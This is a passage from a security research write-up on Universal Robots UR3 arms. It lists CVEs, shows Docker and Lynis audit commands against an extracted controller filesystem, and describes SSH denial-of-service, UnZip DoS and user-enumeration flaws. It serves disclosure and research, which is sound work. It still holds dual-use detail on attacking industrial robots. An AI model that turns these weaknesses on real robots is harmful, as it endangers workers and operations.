    <li>The Data Distribution Service (DDS) Protocol is Critical: Let’s Use it Securely! (<em>to appear</em>), BlackHat Europe 2021</li>
    <li>Breaking ROS 2 security assumptions: Targeting the top 6 DDS implementations (<em>to appear</em>), ROS-Industrial Conference 2021</li>
    </ul></li>
    </ul>
    <h1 id="case-studies">Case studies</h1>
    <h2 id="universal-robot-ur3">Universal Robot UR3</h2>
    <figure>
    <img src="images/2020/ur3.png" alt="Universal Robots UR3 CB series collaborative arm" /><figcaption aria-hidden="true">Universal Robots UR3 CB series collaborative arm</figcaption>
    </figure>
    <p><a href="https://www.universal-robots.com">Universal Robots</a>, a division of Teradyne since 2015, is knowingly ignoring cyber security across their tenths of thousands of robots sold.</p>
    <p>In 2017, IOActive, a world-leader firm in cybersecurity services opened a report <span class="sidenote-wrapper"><label for="sn-13" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-13" class="margin-toggle"/><span class="sidenote">Cerrudo, C., &amp; Apa, L. (2017). Hacking robots before skynet. IOActive Website, 1-17.<br />
    <br />
    </span></span> where among others, described several flaws found in Universal Robots collaborative robots. These included: <a href="https://github.com/aliasrobotics/RVD/issues/6">RVD#6: UR3, UR5, UR10 Stack-based buffer overflow</a>, <a href="https://github.com/aliasrobotics/RVD/issues/15">RVD#15: Insecure transport in Universal Robots’s robot-to-robot communications</a>, <a href="https://github.com/aliasrobotics/RVD/issues/34">RVD#34: Universal Robots Controller supports wireless mouse/keyboards on their USB interface</a>, <a href="https://github.com/aliasrobotics/RVD/issues/672">RVD#672: CB3.1 3.4.5-100 hard-coded public credentials for controller</a>, <a href="https://github.com/aliasrobotics/RVD/issues/673">RVD#673: CB3.1 3.4.5-100 listen and execution of arbitrary URScript code</a>.</p>
    <p>In late 2019 I re-engaged with this work and started researching how insecure these popular robots were. As of 2021, these flaws remain an issue in affecting most of the robots from Universal Robots. Here’re some of the novel findings my research led to:</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1444">CVE-2020-10264</a></td>
    <td>RTDE Interface allows unauthenticated reading of robot data and unauthenticated writing of registers and outputs</td>
    <td>CB-series 3.1 UR3, UR5, UR10, e-series UR3e, UR5e, UR10e, UR16e</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1444">9.8</a></td>
    <td>CB 3.1 SW Version 3.3 and upwards, e-series SW version 5.0 and upwards</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1443">CVE-2020-10265</a></td>
    <td>UR dashboard server enables unauthenticated remote control of core robot functions</td>
    <td>CB-series 2 and 3.1 UR3, UR5, UR10, e-series UR3e, UR5e, UR10e, UR16e</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1443">9.4</a></td>
    <td>Version CB2 SW Version 1.4 upwards, CB3 SW Version 3.0 and upwards, e-series SW Version 5.0 and upwards</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1487">CVE-2020-10266</a></td>
    <td>No integrity checks on UR+ platform artifacts when installed in the robot</td>
    <td>CB-series 3.1 UR3, UR5, UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1487">8.8</a></td>
    <td>CB-series 3.1 FW versions 3.3 up to 3.12.1. Possibly affects older robots and newer (e-series)</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1489">CVE-2020-10267</a></td>
    <td>Unprotected intelectual property in Universal Robots controller CB 3.1 across firmware versions</td>
    <td>CB-series 3.1 UR3, UR5 and UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1489">7.5</a></td>
    <td>tested on 3.13.0, 3.12.1, 3.12, 3.11 and 3.10.0</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1495">CVE-2020-10290</a></td>
    <td>Universal Robots URCaps execute with unbounded privileges</td>
    <td>CB-series 3.1 UR3, UR5 and UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1495">6.8</a></td>
    <td></td>
    </tr>
    </tbody>
    </table>
    <p>An here are some additional examples of flaws identified within the technologies used in the robot, and were previously reported by others:</p>
    <table>
    <colgroup>
    <col style="width: 31%" />
    <col style="width: 68%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>ID</th>
    <th>Description</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1406">RVD#1406</a></td>
    <td>UR’s felix shell console access without credentials on port 6666 (default)</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1409">RVD#1409</a></td>
    <td>X.Org Server (before 1.19.4), replace shared memory segments of other X clients in the same session</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1410">RVD#1410</a></td>
    <td>OpenSSH remote DoS in Universal Robots CB3.x</td>
    </tr>
    </tbody>
    </table>
    <h3 id="context">Context</h3>
    <h4 id="analyzing-universal-robots-commercial-success">Analyzing Universal Robots commercial success</h4>
    <p>Several articles cover and discuss the commercial success of Universal Robots. Often compared with Rethink Robotics, Universal Robots (UR) is generally acknowledged for <em>reading the market better</em> and focusing on solving the problem in a more pragmatic manner, focusing on delivering <em>just about</em> the needed safety capabilities, and no more. Carol Lawrence<span class="sidenote-wrapper"><label for="sn-14" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-14" class="margin-toggle"/><span class="sidenote">Carol Lawrence. Rise and Fall of Rethink Robotics (2019). https://www.asme.org/topics-resources/content/rise-fall-of-rethink-robotics<br />
    <br />
    </span></span> indicates the following:</p>
    <blockquote>
    <p>Universal succeeded because its robots were accurate and repeatable, yet safe enough to work next to people.</p>
    </blockquote>
    <p>Anyone that has operated these robots will probably agree that it sounds about true. Instead of investing additional resources on risk assessment perspective (which from these articles I conclude Rethink Robotics did, at least better?), consider safety standards (using pre-existing norms for safety machinery and security) and focusing on human collaboration (as they were promising), Universal Robots focused on lobbying for market success. It was all about the market, and marketing.</p>
    <p>If one pays close attention, she’ll notice Universal Robots is actually behind the steering of ISO 10218-1 and ISO 10218-2. Reviewing these norms will make a roboticist scream in several senses. These norms are in many ways too tailored to a vendor. Tailored for lobbying. And likely this is the reason why ISO 10218-1/2 is not spreading as much as one would expect. Several countries have even disregarded ISO 10218-1, and their industries are not forced to comply with it.</p>
    <p>More importantly, robots are connected devices. If one compares a robot to an IoT device she will quickly notice that such comparison makes no sense and it’d be more accurate to relate robots with IoT networks (leaving aside the actuation, rarely present in IoT). Robots may operate in an isolated manner, true, but frankly, for most applications that require additional sensing (most that demand adaptability), robots receive external control and coordination instructions from control stations.</p>
    <p>The collaborative behavior that Universal Robots delivers is not only flawed from a safety design perspective but also from a robotics-functionality one. These systems will end up being connected. One should care about this.</p>
    <p>Yet, it seems it still does for clients. Specially because Universal Robots are <code>open</code>. Not in software, but in their architecture<span class="sidenote-wrapper"><label for="sn-15" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-15" class="margin-toggle"/><span class="sidenote">Carol Lawrence. Rise and Fall of Rethink Robotics (2019). https://www.asme.org/topics-resources/content/rise-fall-of-rethink-robotics<br />
    <br />
    </span></span>:</p>
    <blockquote>
    <p>Universal’s business model differed from Rethink’s. Rather than provide an integrated system, it sold only robotic arms and embraced an open architecture that made it easy to add third-party sensors, cameras, grippers, and other accessories. This enabled users and integrators to customize robots for specific tasks.</p>
    </blockquote>
    <p>Openness is great as model for innovation. I spent years working as an open source contributor first in software and hardware, then in robotics. I funded part of my early studies (as many surely did as well) enjoying summers of code funded by Google while working in different organizations. Also, while growing as a roboticist, I interned in several “open” places. Openness is also great (yet challenging) for business, I created and sold a business that contributed to the open source projects in the robotics space. Great learning experience.</p>
    <p>Openness is great, but openness in industry needs to be a) funded and b) backed with a responsible attitude in terms of security. Without care for these matters, you’re simply exposing your creations to third party attacks. When those creations can influence thousands of businesses, you should start growing concerned.</p>
    <h4 id="an-open-architecture-that-doesnt-care-about-security">An open architecture that doesn’t care about security</h4>
    <p>Delivering an open architecture doesn’t mean that you can disregard security. Security by obscurity is not security, true. But neither you should open it up and just disregard it if your systems will be used in industry, by people. That pitch doesn’t work when robots get out of the lab and jump into real use cases. Universal Robots is well known from claims like:</p>
    <blockquote>
    <p>Security is up to the user.</p>
    </blockquote>
    <p>A security-first approach must be adopted. One that goes from the design-phase, down to the post-production one. If you’re interested in secure development and secure architectures, refer to some work on DevSecOps <span class="sidenote-wrapper"><label for="sn-16" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-16" class="margin-toggle"/><span class="sidenote">Mayoral-Vilches, V., García-Maestro, N., Towers, M., &amp; Gil-Uriarte, E. (2020). DevSecOps in Robotics. arXiv preprint arXiv:2003.10402.<br />
    <br />
    </span></span> in robotics I co-authored and released not so long ago.</p>
    <p>The ultimate proof however comes from the facts. So let’s provide some evidence by bringing up the rootfs of UR robots in a Docker container and perform some investigations. Head to this tutorial’s folder and do:</p>
    <div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. fetch the raw disk image inside of the container</span></span>
    <span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> ur3_cb3.1_fetcher:3.9.1 .</span>
    <span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. create temporary directory</span></span>
    <span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> tmp</span>
    <span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. extract the compressed rootfs from the container</span></span>
    <span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> container run <span class="at">--rm</span> <span class="at">--privileged</span> <span class="at">-it</span> <span class="at">-v</span> <span class="va">${PWD}</span>/tmp:/outside ur3_cb3.1_fetcher:3.9.1</span>
    <span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. create container from the rootfs</span></span>
    <span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> import tmp/ur-fs.tar.gz ur3_cb3.1:3.9.1</span>
    <span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. cleanup</span></span>
    <span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-r</span> tmp</span>
    <span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. run the container</span></span>
    <span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> ur3_cb3.1:3.9.1 /bin/bash</span></code></pre></div>
    <p>Now let’s see how much UR cares about security:</p>
    <div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> ur3_cb3.1:3.9.1 /bin/bash</span>
    <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">dircolors:</span> no SHELL environment variable, and no shell type option given</span>
    <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/#</span> ls</span>
    <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">bin</span>   bsp-MS-98G6.md5sums  dev  home        joint_firmware.md5sums  lost+found  mnt  pc.md5sums  programs  run   selinux  srv  tmp  var</span>
    <span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">boot</span>  common.md5sums       etc  initrd.img  lib                     media       opt  proc        root      sbin  setup    sys  usr</span>
    <span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/#</span></span>
    <span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/#</span> cat /etc/issue</span>
    <span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Debian</span> GNU/Linux 7 <span class="dt">\n</span> <span class="dt">\l</span></span></code></pre></div>
    <p>Universal Robots controllers run Debian “wheezy” which was released in May 2013 and entered End-of-life (EoL) in May 2018 according to the Debian Long Term Support (LTS) page:</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/04/Captura-de-pantalla-2020-04-19-a-las-16.11.31.png" alt="Debian LTS time table from June 17,2018" /><figcaption aria-hidden="true">Debian LTS time table from June 17,2018</figcaption>
    </figure>
    <p>Some of you might be thinking that ELTS. There’s <strong>Extended</strong> Long Term Support. One could think that Universal Robots is actively supporting openness (and open source) by financially supporting Debian and receiving extended support:</p>
    <figure>
    <img src="https://cybersecurityrobotics.net/content/images/2020/04/Captura-de-pantalla-2020-04-19-a-las-16.16.39.png" alt="Debian ELTS time table" /><figcaption aria-hidden="true">Debian ELTS time table</figcaption>
    </figure>
    <p>While plausible in terms of date, unfortunately, it doesn’t seem to be the case. While it may sound harsh, one wonders: <em>regardless of the investments made in marketing and communication, how much is the “openness” pitch of Universal Robots worth it?</em></p>
    <h3 id="searching-for-flaws-in-the-rootfs">Searching for flaws in the rootfs</h3>
    <p>Let’s now use a popular security tool to scan the rootfs for insecure components. You’ll observe below how deb package sources are unmaintained, so we’ll manually change those to install</p>
    <div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># deb sources unmaintained</span></span>
    <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/#</span> apt-get update</span>
    <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Err</span> http://packages.ur-update.dk ./ Release.gpg</span>
    <span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Could</span> not resolve <span class="st">&#39;packages.ur-update.dk&#39;</span></span>
    <span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Reading</span> package lists... Done</span>
    <span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">W:</span> Failed to fetch http://packages.ur-update.dk/ubuntu/./Release.gpg  Could not resolve <span class="st">&#39;packages.ur-update.dk&#39;</span></span>
    <span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">W:</span> Some index files failed to download. They have been ignored, or old ones used instead.</span>
    <span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="co"># update source.list with archived packages</span></span>
    <span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&lt;&lt; EOF</span> <span class="op">&gt;</span> /etc/apt/sources.list</span>
    <span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="st">deb http://archive.debian.org/debian wheezy main</span></span>
    <span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="st">deb http://archive.debian.org/debian-archive/debian-security/ wheezy updates/main</span></span>
    <span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
    <span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="co"># install git</span></span>
    <span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install git <span class="at">-y</span></span>
    <span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Fetch and run Lynis</span></span>
    <span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/etc#</span> git clone https://github.com/CISOfy/lynis</span>
    <span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Cloning</span> into <span class="st">&#39;lynis&#39;</span>...</span>
    <span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a><span class="ex">remote:</span> Enumerating objects: 14350, done.</span>
    <span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a><span class="ex">remote:</span> Counting objects: 100% <span class="er">(</span><span class="ex">492/492</span><span class="kw">)</span><span class="ex">,</span> done.</span>
    <span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="ex">remote:</span> Compressing objects: 100% <span class="er">(</span><span class="ex">244/244</span><span class="kw">)</span><span class="ex">,</span> done.</span>
    <span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="ex">remote:</span> Total 14350 <span class="er">(</span><span class="ex">delta</span> 320<span class="kw">)</span><span class="ex">,</span> reused 389 <span class="er">(</span><span class="ex">delta</span> 248<span class="kw">)</span><span class="ex">,</span> pack-reused 13858</span>
    <span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Receiving</span> objects: 100% <span class="er">(</span><span class="ex">14350/14350</span><span class="kw">)</span><span class="ex">,</span> 7.63 MiB, done.</span>
    <span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="ex">Resolving</span> deltas: 100% <span class="er">(</span><span class="ex">10564/10564</span><span class="kw">)</span><span class="ex">,</span> done.</span>
    <span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/etc#</span> cd lynis/</span>
    <span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/etc/lynis#</span> ls</span>
    <span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a><span class="ex">CHANGELOG.md</span>        CONTRIBUTING.md  FAQ             INSTALL  README     SECURITY.md  db           developer.prf  include  lynis.8</span>
    <span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="ex">CODE_OF_CONDUCT.md</span>  CONTRIBUTORS.md  HAPPY_USERS.md  LICENSE  README.md  TODO.md      default.prf  extras         lynis    plugins</span>
    <span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a><span class="ex">root@0ad90f762e89:/etc/lynis#</span> ./lynis audit system</span>
    <span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> Lynis 3.0.7 <span class="bu">]</span></span>
    <span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a><span class="co">################################################################################</span></span>
    <span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Lynis</span> comes with ABSOLUTELY NO WARRANTY. This is free software, and you are</span>
    <span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>  <span class="ex">welcome</span> to redistribute it under the terms of the GNU General Public License.</span>
    <span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a>  <span class="ex">See</span> the LICENSE file for details about using this software.</span>
    <span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>  <span class="ex">2007-2021,</span> CISOfy <span class="at">-</span> https://cisofy.com/lynis/</span>
    <span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Enterprise</span> support available <span class="er">(</span><span class="ex">compliance,</span> plugins, interface and tools<span class="kw">)</span></span>
    <span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a><span class="co">################################################################################</span></span>
    <span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Initializing program</span>
    <span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a><span class="ex">------------------------------------</span></span>
    <span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a>  <span class="ex">-</span> Detecting OS...                                           [ DONE ]</span>
    <span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a>  <span class="ex">-</span> Checking profiles...                                      [ DONE ]</span>
    <span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a>  <span class="ex">---------------------------------------------------</span></span>
    <span id="cb3-53"><a href="#cb3-53" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Program</span> version:           3.0.7</span>
    <span id="cb3-54"><a href="#cb3-54" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Operating</span> system:          Linux</span>
    <span id="cb3-55"><a href="#cb3-55" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Operating</span> system name:     Debian</span>
    <span id="cb3-56"><a href="#cb3-56" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Operating</span> system version:  7</span>
    <span id="cb3-57"><a href="#cb3-57" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Kernel</span> version:            5.10.25</span>
    <span id="cb3-58"><a href="#cb3-58" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Hardware</span> platform:         x86_64</span>
    <span id="cb3-59"><a href="#cb3-59" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Hostname:</span>                  0ad90f762e89</span>
    <span id="cb3-60"><a href="#cb3-60" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-61"><a href="#cb3-61" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb3-62"><a href="#cb3-62" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-63"><a href="#cb3-63" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Check PAM configuration, add rounds if applicable and expire passwords to encrypt with new values [AUTH-9229]</span>
    <span id="cb3-64"><a href="#cb3-64" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9229/</span></span>
    <span id="cb3-65"><a href="#cb3-65" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-66"><a href="#cb3-66" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Configure password hashing rounds in /etc/login.defs [AUTH-9230]</span>
    <span id="cb3-67"><a href="#cb3-67" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9230/</span></span>
    <span id="cb3-68"><a href="#cb3-68" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-69"><a href="#cb3-69" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Install a PAM module for password strength testing like pam_cracklib or pam_passwdqc [AUTH-9262]</span>
    <span id="cb3-70"><a href="#cb3-70" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9262/</span></span>
    <span id="cb3-71"><a href="#cb3-71" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-72"><a href="#cb3-72" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> When possible set expire dates for all password protected accounts [AUTH-9282]</span>
    <span id="cb3-73"><a href="#cb3-73" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9282/</span></span>
    <span id="cb3-74"><a href="#cb3-74" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-75"><a href="#cb3-75" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Configure minimum password age in /etc/login.defs [AUTH-9286]</span>
    <span id="cb3-76"><a href="#cb3-76" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9286/</span></span>
    <span id="cb3-77"><a href="#cb3-77" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-78"><a href="#cb3-78" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Configure maximum password age in /etc/login.defs [AUTH-9286]</span>
    <span id="cb3-79"><a href="#cb3-79" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9286/</span></span>
    <span id="cb3-80"><a href="#cb3-80" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-81"><a href="#cb3-81" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Default umask in /etc/login.defs could be more strict like 027 [AUTH-9328]</span>
    <span id="cb3-82"><a href="#cb3-82" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9328/</span></span>
    <span id="cb3-83"><a href="#cb3-83" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-84"><a href="#cb3-84" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Default umask in /etc/init.d/rc could be more strict like 027 [AUTH-9328]</span>
    <span id="cb3-85"><a href="#cb3-85" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/AUTH-9328/</span></span>
    <span id="cb3-86"><a href="#cb3-86" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb3-87"><a href="#cb3-87" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> To decrease the impact of a full /home file system, place /home on a separate partition [FILE-6310]</span>
    <span id="cb3-88"><a href="#cb3-88" aria-hidden="true" tabindex="-1"></a>    <span class="ex">https://cisofy.com/lynis/controls/FILE-6310/</span></span>
    <span id="cb3-89"><a href="#cb3-89" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
    <p>The incomplete trace of Lynis above already provides a number of hints on how to start breaking the system. I’ll leave it there and jump into some examples of the findings.</p>
    <h3 id="vulnerabilities">Vulnerabilities</h3>
    <h4 id="denial-of-service-exploiting-an-ssh-vulnerability-in-universal-robots">Denial of Service exploiting an SSH vulnerability in Universal Robots</h4>
    <p><a href="https://github.com/aliasrobotics/RVD/issues/1410">RVD#1410</a> shows a) evidence that Universal Robots cares very little about security and b) the importance of having a security team working with your engineers.</p>
    <p>This flaw was **found in 2016 and assigned a CVE ID <code>CVE-2016-6210</code>. We confirmed that this vulnerability applies to all the latest releases from Universal Robots over the past 12 months approximately:</p>
    <ul>
    <li>Universal Robots CB3.1, firmware version 3.12.1 (latest at the time of writing)</li>
    <li>Universal Robots CB3.1, firmware version 3.12</li>
    <li>Universal Robots CB3.1, firmware version 3.11</li>
    <li>Universal Robots CB3.1, firmware version 3.10</li>
    </ul>
    <p>Having tested this far, we’re somewhat certain that, if you own a UR3, UR5 or UR10, chances are your robot ships an openssh version that’s vulnerable to Denial of Service by external aunthenticated users. Particularly, we found that the Universal Robots Controllers’ file system (based in Debian) allows attackers with networking connection to the robot to cause a Denial of Service via the auth_password function in auth-passwd.c. <code>sshd</code> in OpenSSH, before 7.3 does not limit password lengths for password authentication, which allows remote attackers to cause a denial of service (crypt CPU consumption) via a long string.</p>
    <p><a href="https://asciinema.org/a/315015"><img src="https://asciinema.org/a/315015.svg" alt="asciicast" /></a></p>
    <h4 id="unzip-6.0-allows-remote-attackers-to-cause-a-denial-of-service-infinite-loop-via-empty-bzip2-data-in-a-zip-archive">UnZip 6.0 allows remote attackers to cause a denial of service (infinite loop) via empty bzip2 data in a ZIP archive</h4>
    <p>This is a fun one, so we decided to make a exploit, add it to <code>robotsploit</code> and record it. UR3, UR5 and UR10, powered by CB3.1 (with all the firmware versions we tested), are vulnerable to this security bug. A lack of security maintenance of UnZip allows one to perform Denial of Service. The video below shows how we can prevent the system from operating in normal conditions by simply unzipping a specially-crafted zip file.</p>
    <p><a href="https://asciinema.org/a/J41V4mjoEAwVdfPBPstEdasTY"><img src="https://asciinema.org/a/J41V4mjoEAwVdfPBPstEdasTY.svg" alt="asciicast" /></a></p>
    <h4 id="user-enumeration-in-universal-robots-control-box-cb3.x">User enumeration in Universal Robots Control Box CB3.x</h4>
    <p>We found that the Universal Robots’ Controllers’ file system based in Debian is subject to CVE-2016-6210 which allows attackers to perform unauthenticated user enumeration. The flaw affects OpenSSH which is exposed by default in port 22.</p>
